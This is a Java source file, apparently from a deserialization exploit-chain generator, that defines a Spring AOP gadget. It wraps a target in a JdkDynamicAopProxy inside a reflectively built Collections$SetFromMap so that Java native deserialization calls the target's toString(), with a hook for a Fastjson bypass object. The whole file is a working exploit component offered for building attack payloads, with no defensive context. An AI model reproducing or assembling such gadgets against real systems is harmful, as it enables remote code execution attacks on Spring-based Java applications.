package com.ar3h.plugin.fr.gadget.impl.javanative.spring;

import com.ar3h.chains.common.ContextTag;
import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.util.CommonMethod;
import com.ar3h.chains.common.util.Reflections;
import org.springframework.aop.framework.AdvisedSupport;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Collections;
import java.util.Map;

@GadgetTags(
        tags = {"JavaNativeDeserialize"},
        nextTags = {"ToString"}
)
@GadgetAnnotation(
        name = "SpringAop 调用 toString",
        description = "JdkDynamicAopProxy#invoke 方法调用任意对象的 toString() 方法",
        dependencies = {"org.springframework:spring-aop"},
        priority = 10
)
public class SpringAopToString implements Gadget {

    public Object getObject(Object object) throws Exception {
        Object m = makeJdkDynamicAopProxy(object, new Class[]{Map.class});
        Object map  = Reflections.newInstance("java.util.Collections$SetFromMap", Collections.EMPTY_MAP);
        Reflections.setFieldValue(map, "m", m);
        return map;
    }

    public static Object makeJdkDynamicAopProxy(Object object, Class<?>[] interfaces) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(object);
        InvocationHandler handler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy",new Class[]{AdvisedSupport.class}, advisedSupport);
        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), interfaces, handler);
    }

    public Object invoke(GadgetContext context, GadgetChain chain) throws Exception {
        Object object = chain.doCreate(context);
        Object getterObject = context.get(ContextTag.FASTJSON_HANDLE_BYPASS_KEY);
        Object resultObject = this.getObject(object);
        return getterObject != null ? CommonMethod.listWrap(getterObject, resultObject) : resultObject;
    }
}
